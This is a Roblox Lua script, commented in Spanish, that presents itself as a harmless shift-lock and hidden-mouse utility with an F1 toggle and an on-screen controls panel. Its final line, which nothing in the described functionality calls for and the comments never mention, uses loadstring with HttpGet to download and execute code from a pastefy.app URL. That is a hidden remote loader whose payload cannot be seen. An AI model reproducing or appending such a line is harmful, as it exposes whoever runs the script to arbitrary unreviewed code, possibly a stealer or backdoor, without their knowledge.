-- Shift Lock + Mouse oculto (SIN reiniciar el personaje)
-- F1 = Liberar ratón para poder hacer clic

local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local enabled = true
local connection

-- Limpiar GUI anterior si ya existe (para no duplicar)
if playerGui:FindFirstChild("Controles") then
    playerGui.Controles:Destroy()
end

-- ===== Panel de teclas =====
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "Controles"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 170, 0, 175)
frame.Position = UDim2.new(0, 15, 0.5, -90)
frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
frame.BackgroundTransparency = 0.2
frame.BorderSizePixel = 0
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 28)
title.Position = UDim2.new(0, 0, 0, 6)
title.BackgroundTransparency = 1
title.Text = "CONTROLES"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 15
title.Parent = frame

local info = {
    {txt = "W A S D  →  Moverse", y = 40},
    {txt = "F1  →  Liberar ratón", y = 70},
    {txt = "(para hacer clic)", y = 95},
    {txt = "F1 otra vez", y = 125},
    {txt = "→  Volver a ocultar", y = 150}
}

for _, v in pairs(info) do
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -10, 0, 22)
    label.Position = UDim2.new(0, 10, 0, v.y)
    label.BackgroundTransparency = 1
    label.Text = v.txt
    label.TextColor3 = Color3.fromRGB(230, 230, 230)
    label.Font = Enum.Font.Gotham
    label.TextSize = 13
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = frame
end

-- ===== Funciones (sin tocar el personaje de forma peligrosa) =====
local function activar()
    UIS.MouseIconEnabled = false
    UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
    frame.Visible = true

    if connection then
        connection:Disconnect()
        connection = nil
    end

    connection = RunService.RenderStepped:Connect(function()
        if not enabled then return end

        UIS.MouseIconEnabled = false
        UIS.MouseBehavior = Enum.MouseBehavior.LockCenter

        local character = player.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            local root = character:FindFirstChild("HumanoidRootPart")
            if humanoid and root and humanoid.Health > 0 then
                humanoid.AutoRotate = false
                local _, y = workspace.CurrentCamera.CFrame:ToEulerAnglesYXZ()
                root.CFrame = CFrame.new(root.Position) * CFrame.Angles(0, y, 0)
            end
        end
    end)
end

local function desactivar()
    if connection then
        connection:Disconnect()
        connection = nil
    end

    UIS.MouseIconEnabled = true
    UIS.MouseBehavior = Enum.MouseBehavior.Default
    frame.Visible = false

    local character = player.Character
    if character then
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.AutoRotate = true
        end
    end
end

-- Activar al inicio (sin reiniciar personaje)
activar()

-- F1 para liberar / ocultar el ratón
UIS.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == Enum.KeyCode.F1 then
        enabled = not enabled
        if enabled then
            activar()
        else
            desactivar()
        end
    end
end)

print("✅ Script listo - No reinicia el personaje")
print("F1 = Liberar ratón para hacer clic en botones")

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()